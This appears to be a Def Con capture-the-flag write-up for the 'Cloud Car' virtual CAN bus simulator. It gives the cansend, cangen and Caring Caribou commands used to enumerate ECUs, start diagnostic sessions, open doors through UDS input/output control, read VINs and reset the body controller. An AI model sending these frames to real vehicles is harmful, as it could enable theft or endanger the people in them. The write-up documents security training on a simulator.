# Cloud Car
Virtual can bus hacking at https://cloudcar.canbushack.com/simulator


## Cloud Car START HERE - 100

Please go to [https://cloudcar.canbushack.com](https://cloudcar.canbushack.com)

Cloud Car is FREE during Def Con.

Please watch the YouTube Getting Started if you have any questions: [https://youtu.be/0CjFu-K3gNY](https://youtu.be/0CjFu-K3gNY)

Like the video Please!! It's my first one ever.

Flag is guessable.

Guesses:
- canbushack

- carfucar

- cloudcar

- hacktheplanet

Told after competition that flag was: `{flag}cloudcar`


## Kylle Door Open - 50

With [Cloud Car](https://cloudcar.canbushack.com)

Using CAN Messaging, open the **Driver Door**.

[https://cloudcar.canbushack.com](https://cloudcar.canbushack.com)

Looking at `cansniffer`, see messages from ArbId 12D that update when the door is opened/closed. Tried sending my own messages with that ArbID, but was dead end. Likely that these are just status messages, and control happens elswhere.

From `@fearfulspoon` on Discord:

- enumerated for ECUs
- enumerated for Services across those ECUs
- enumerated for Sub-functions across those services

For the physical stuff, I started looking at service

```
0x2F - INPUT_OUTPUT_CONTROL_BY_IDENTIFIER
```

At first I got back a bunch of "nopes" on those scans, but then I ran them after starting a Diagnostic Control Session.

```bash
# Send Diag control prior to scan.
cansend vcan0 '620#0210020000000000'

# enumerate subfunctions for 2F - INPUT_OUTPUT_CONTROL_BY_IDENTIFIER
./cc.py dcm subfunc 0x620 0x520 0x2f 2 3
-------------------
CARING CARIBOU v0.3
-------------------
Loaded module 'dcm'
Starting DCM sub-function discovery
Probing sub-function 0x2f data ['ff', 'ff'] (found: 8)
Done: Scan finished
Found sub-functions for service 0x2f (INPUT_OUTPUT_CONTROL_BY_IDENTIFIER):
Sub-function 02 0d
Sub-function 02 a0
Sub-function 02 a1
Sub-function 02 a2
Sub-function 14 36
Sub-function 22 24
Sub-function 22 25
Sub-function 33 34
```

After that, I started sending data to the sub-functions. Example

```
cangen vcan0 -I 620 -D 072F2224FFFFFFFF -L 8
```

This caused the driver door to open. Sending 0s instead of Fs closed it. I never narrowed down which bit actually did the door, but it didn't matter at that point.

Went through and tested all the IOCBI sub-functions I found and was able to do wipers, sprayer, headlights, flashers, doors, trunk, fuel pump, and the Temp on the cluster.

One of the IOCBI sub functions makes the car go fast with out any gas, btw. Fun bug.


## Get In Door Open - 50

With [Cloud Car](https://cloudcar.canbushack.com)

Using CAN Messaging, open the **Passenger Door**.

I tried the same things as the other door, but no luck. The techniques the other team used for solving previous challenge work for this one, too.


## Engine Memory - 50

With [Cloud Car](https://cloudcar.canbushack.com)

Using CAN Messaging, read the **ECM Memory**.

```bash
# DID NOT ATTEMPT
```


## Engine Overspeed - 50

With [Cloud Car](https://cloudcar.canbushack.com)

Using CAN Messaging, make the **Engine Speed High **.

I didn't attempt this one. I talked to one of the other teams, and they said they got it to work by sending messages to ArbIDs 0x064 and 0x074. They changed some of the octets to all F's and it worked. Haven't tried to see exactly how they pulled it off.

Here's a snapshot of sniffing normal traffic:

```
$ cansniffer -ct0 vcan0
00|ms | ID  | data ...     < vcan0 # l=20 h=100 t=0 slots=1 >
00232 | 064 | 27 10 00 B6 10 5A       '....Z
00022 | 074 | C0 0D 70 8E D1 96 00 00 ..p.....
00051 | 12D | 00 3E 00 16 00 00       .>....
00025 | 202 | 00 00 00                ...
00206 | 264 | 03 00 00 00 00 00 00 00 ........
00132 | 2EE | DD CC EE FF 00 00       ......
05195 | 350 | 3F 01 0C 00 00 1F       ?.....
00443 | 411 | 00 F4 EB 3E 2B A1 B7 B0 ...>+...
00147 | 420 | F0 0D 04 00 00 00       ......
00119 | 42C | 00 00 04 03 02 01 00 00 ........
```


## Lights - 50

With [Cloud Car](https://cloudcar.canbushack.com)

Using CAN Diagnostic Messaging, **Activate the Headlights**.

I tried all the same tricks I used for the open door commands, but nothing worked. See [Kylle Door Open - 50](#Kylle%20Door%20Open%20-%2050) for a hint at the solution.


## Cluster Session Control - 50

With [Cloud Car](https://cloudcar.canbushack.com)

Using CAN Messaging, **IPC (Cluster) Session Control** to Enhanced Diagnostics.

```bash
# DID NOT ATTEMPT
```


## Engine Speed Read - 50

With [Cloud Car](https://cloudcar.canbushack.com)

Using CAN Messaging, read the **Engine Speed** from the ECM.

Here's what I tried, but it didn't work. Based off of Wikipedia's list of [OBD2 PIDs](https://en.wikipedia.org/wiki/OBD-II_PIDs)
```bash
# log all CAN messages
candump -l vcan0

# send OBD2 messages requesting engine speed to every ArbID
cangen vcan0 -g1 -Ii -L8 -D 02010C0000000000

# search the log for a successful response
grep -i "410C" candump*.log
```


## Airbag VIN - 75

This is a VIN. But in the Airbag Controller!

I wrote a script that grabs the VIN using the UDS "Read Data By Identifier" service (0x22), VIN request (identifier 0xF190).

`getvin.sh`:
```bash
#!/bin/bash

iface="${1:-vcan0}"
src="${2:-7e0}"
dst="${3:-7e8}"

# exit on error
set -e

# sniff and capture responses
VINFILE="$(mktemp -u /tmp/vin-isotp-XXX)"
isotprecv -s "$src" -d "$dst" -p 00 "$iface" > "$VINFILE" &
recv_pid=$!

# send the "get VIN" request
echo -n '22 f1 90' | isotpsend -s "$src" -d "$dst" -p 00 "$iface"
sleep 0.1

# parse out VIN
cat "$VINFILE"
tail -c +10 "$VINFILE" | xxd -p -r
echo

rm "$VINFILE"
kill $recv_pid &>/dev/null || true
```

```bash
# run my script to get the VIN
$ ~/dev/getvin.sh vcan0 7f1 7f9
62 F1 90 01 31 46 4C 41 47 56 49 4E 53 52 53 34 32 30 36 39 30
1FLAGVINSRS420690
```


## You Scanning (1st), (2nd) & (Last) - 100

With [Cloud Car](https://cloudcar.canbushack.com)

Using CAN Messaging, **SCAN for Diagnostic IDs**.

Get all 3 Flags from Cloud Car.

```bash
$ cat ~/.canrc
[default]
interface = socketcan

# figure out what ECUs are out there responding to probes
$ python3 cc.py -i vcan0 uds discovery
Identified diagnostics:
+------------+------------+
| 0x00000071 | 0x0000012d |
| 0x00000620 | 0x00000520 |
| 0x00000622 | 0x00000522 |
| 0x0000062c | 0x0000052c |
| 0x000007e0 | 0x000007e8 |
| 0x000007e2 | 0x000007e9 |
| 0x000007f1 | 0x000007f9 |
+------------+------------+

# Re-ran, didn't see 12d response ID anymore
+------------+------------+
| CLIENT ID  | SERVER ID  |
+------------+------------+
| 0x00000620 | 0x00000520 |
| 0x00000622 | 0x00000522 |
| 0x0000062c | 0x0000052c |
| 0x000007e0 | 0x000007e8 |
| 0x000007e2 | 0x000007e9 |
| 0x000007f1 | 0x000007f9 |
+------------+------------+

# perform service discovery
$ python3 cc.py -i vcan0 uds services 0x620 0x520
Supported service 0x10: DIAGNOSTIC_SESSION_CONTROL
Supported service 0x11: ECU_RESET
Supported service 0x22: READ_DATA_BY_IDENTIFIER
Supported service 0x23: READ_MEMORY_BY_ADDRESS
Supported service 0x27: SECURITY_ACCESS
Supported service 0x28: COMMUNICATION_CONTROL
Supported service 0x2e: WRITE_DATA_BY_IDENTIFIER
Supported service 0x2f: INPUT_OUTPUT_CONTROL_BY_IDENTIFIER
Supported service 0x3e: TESTER_PRESENT
Supported service 0xba: Unknown service

$ python3 cc.py -i vcan0 uds services 0x622 0x522
Supported service 0x10: DIAGNOSTIC_SESSION_CONTROL
Supported service 0x11: ECU_RESET
Supported service 0x22: READ_DATA_BY_IDENTIFIER
Supported service 0x23: READ_MEMORY_BY_ADDRESS
Supported service 0x27: SECURITY_ACCESS
Supported service 0x28: COMMUNICATION_CONTROL
Supported service 0x2e: WRITE_DATA_BY_IDENTIFIER
Supported service 0x2f: INPUT_OUTPUT_CONTROL_BY_IDENTIFIER
Supported service 0x3e: TESTER_PRESENT
Supported service 0xba: Unknown service

$ python3 cc.py -i vcan0 uds services 0x62c 0x52c
Supported service 0x10: DIAGNOSTIC_SESSION_CONTROL
Supported service 0x11: ECU_RESET
Supported service 0x22: READ_DATA_BY_IDENTIFIER
Supported service 0x23: READ_MEMORY_BY_ADDRESS
Supported service 0x27: SECURITY_ACCESS
Supported service 0x28: COMMUNICATION_CONTROL
Supported service 0x2f: INPUT_OUTPUT_CONTROL_BY_IDENTIFIER
Supported service 0x3e: TESTER_PRESENT
Supported service 0xba: Unknown service

$ python3 cc.py -i vcan0 uds services 0x7e0 0x7e8
Supported service 0x10: DIAGNOSTIC_SESSION_CONTROL
Supported service 0x11: ECU_RESET
Supported service 0x22: READ_DATA_BY_IDENTIFIER
Supported service 0x23: READ_MEMORY_BY_ADDRESS
Supported service 0x27: SECURITY_ACCESS
Supported service 0x28: COMMUNICATION_CONTROL
Supported service 0x2e: WRITE_DATA_BY_IDENTIFIER
Supported service 0x2f: INPUT_OUTPUT_CONTROL_BY_IDENTIFIER
Supported service 0x3e: TESTER_PRESENT
Supported service 0xba: Unknown service

$ python3 cc.py -i vcan0 uds services 0x7e2 0x7e9
Supported service 0x10: DIAGNOSTIC_SESSION_CONTROL
Supported service 0x11: ECU_RESET
Supported service 0x22: READ_DATA_BY_IDENTIFIER
Supported service 0x23: READ_MEMORY_BY_ADDRESS
Supported service 0x27: SECURITY_ACCESS
Supported service 0x28: COMMUNICATION_CONTROL
Supported service 0x2f: INPUT_OUTPUT_CONTROL_BY_IDENTIFIER
Supported service 0x3e: TESTER_PRESENT
Supported service 0xba: Unknown service

$ python3 cc.py -i vcan0 uds services 0x7f1 0x7f9
Supported service 0x10: DIAGNOSTIC_SESSION_CONTROL
Supported service 0x11: ECU_RESET
Supported service 0x22: READ_DATA_BY_IDENTIFIER
Supported service 0x27: SECURITY_ACCESS
Supported service 0x2e: WRITE_DATA_BY_IDENTIFIER
Supported service 0x3e: TESTER_PRESENT

# dump Data Identifiers for each ECU
$ python3 cc.py -i vcan0 uds dump_dids 0x620 0x520 -t0.1
Identified DIDs:
DID    Value (hex)
0x020d 62020d00
0x020e 62020e90
0x02a0 6202a000
0x02a1 6202a100
0x02a2 6202a200
0x1436 62143600
0x1703 62170300
0x1704 62170400
0x2224 62222400
0x2225 62222500
0x3334 62333400
0x4200 62420000000000

$ python3 cc.py -i vcan0 uds dump_dids 0x622 0x522 -t0.1
Identified DIDs:
DID    Value (hex)
0x010c 62010c0d70
0x010f 62010f00
0x0210 6202101f
0x0214 62021441
0x0300 62030001
0x030c 62030c01
0x0320 62032000
0x0345 62032100
0xfe00 62fe00010c0000
0xfe10 62fe10010c0000

$ python3 cc.py -i vcan0 uds dump_dids 0x7e0 0x7e8 -t0.1
Identified DIDs:
DID    Value (hex)
0x000c 62000c0d70
0x000d 62000d00
0x1000 62100001
0x2122 622122013143414e4255534841434b49534330304c
0x4200 624200010c0000

$ python3 cc.py -i vcan0 uds dump_dids 0x7e2 0x7e9 -t0.1
Identified DIDs:
DID    Value (hex)
0x010c 62010c0d70
0x010f 62010f00
0x030c 62030c01
0x0911 62091182

$ python3 cc.py -i vcan0 uds dump_dids 0x7f1 0x7f9 -t0.1
Identified DIDs:
DID    Value (hex)
0x1111 62111100
0xf1a0 62f1900131464c414756494e535253343230363930
0xfa01 62fa0100
0xfa02 62fa0201
0xfa03 62fa0001
0xfa06 62fa06010101

# decoding values discovered from dump_dids:
❯ echo "3143414e4255534841434b49534330304c" | xxd -r -p
1CANBUSHACKISC00L  # <-- new (whole) VIN

❯ echo "31464c414756494e535253343230363930" | xxd -r -p
1FLAGVINSRS420690  # <-- ABS VIN
```

Unfortunately, I didn't find any of the 3 flags, and don't know where to go from here.


## Whole VIN - 150

With [Cloud Car](https://cloudcar.canbushack.com)

What's the **VIN**? You have to read from the ECM!

```bash
# trying with OBD2 (also tried on all ArbIDs 7e0-7e7)
$ echo "09 02" | isotpsend -s 7df -d 7e8 -p 00 vcan0
# failed

# trying with UDS "get VIN" (also tried on al ArbIDs 7e0-7e7)
$ echo "22 f1 90" | isotpsend -s 7e0 -d 7e8 -p 00 vcan0
# failed
```

`getvin.sh`:
```bash
#!/bin/bash

iface="${1:-vcan0}"
src="${2:-7e0}"
dst="${3:-7e8}"

# exit on error
set -e

# sniff and capture responses
VINFILE="$(mktemp -u /tmp/vin-isotp-XXX)"
isotprecv -s "$src" -d "$dst" -p 00 "$iface" > "$VINFILE" &
recv_pid=$!

# send the "get VIN" request
echo -n '09 02' | isotpsend -s "$src" -d "$dst" -p 00 "$iface"
sleep 0.1

# parse out VIN
cat "$VINFILE"
tail -c +10 "$VINFILE" | xxd -p -r
echo

rm "$VINFILE"
kill $recv_pid &>/dev/null || true
```

All those attempts failed. By chance, when I was [scanning](#You%20Scanning%201st%202nd%20Last%20-%20100), the `dump_dids` command showed me the other VIN:

```bash
$ python3 cc.py -i vcan0 uds dump_dids 0x7e0 0x7e8 -t0.1
Identified DIDs:
DID    Value (hex)
0x000c 62000c0d70
0x000d 62000d00
0x1000 62100001
0x2122 622122013143414e4255534841434b49534330304c
0x4200 624200010c0000

$ echo "3143414e4255534841434b49534330304c" | xxd -r -p
1CANBUSHACKISC00L
```


## Reset Body Cntl - 175

With [Cloud Car](https://cloudcar.canbushack.com)

Using CAN Messaging, open the **Reset the BCM**.

I tried using `caringcaribou` to reset the ECU's but I think I needed to establish a diagnostic session first? My attempts failed.

```bash
$ python3 cc.py -i vcan0 uds ecu_reset 0x7e0 0x7e8
# tried sending to all identified ECU pairs:
# 0x620 -> 0x520
# 0x622 -> 0x522
# 0x62c -> 0x52c
# 0x7e0 -> 0x7e8
# 0x7e2 -> 0x7e9
# 0x7f1 -> 0x7f9
```

`@fearfulspoon` on Discord sent me his solution:

```bash
# Start Diagnostic Control Session with the BCM
cansend vcan0 '620#0210020000000000'

# Send Reset ECU (0x03 = softReset)
cansend vcan0 '620#0211030000000000'

# also attempted 0x01 (hardReset) and 0x02 (keyOffOnReset)
# first, but received errors.
```

So I was definitely missing the "start diagnostic session" piece. Knowing which ArbID corresponded to the BCM was partly just guesswork, but it is the same one that was used for actuating the doors, which makes sense (that's a typical BCM function).

## Rollback - 200

With [Cloud Car](https://cloudcar.canbushack.com)

Using CAN Messaging, open the **Roll Odometer back to ZERO**.

```bash
# DID NOT ATTEMPT
```


## Sec Escalate - 500

With [Cloud Car](https://cloudcar.canbushack.com)

Using CAN Messaging, open the **Update your Security Level on Controller**.

```bash
# DID NOT ATTEMPT
```


## Puff Air Bag YES - 650

With [Cloud Car](https://cloudcar.canbushack.com)

Using CAN Messaging, open the **Activate the Airbag**.

If you do this, you are the like insane! Nice work.

If you're the first to do this, We have a special Prize for you! (find @carfucar).

```bash
# DID NOT ATTEMPT
```

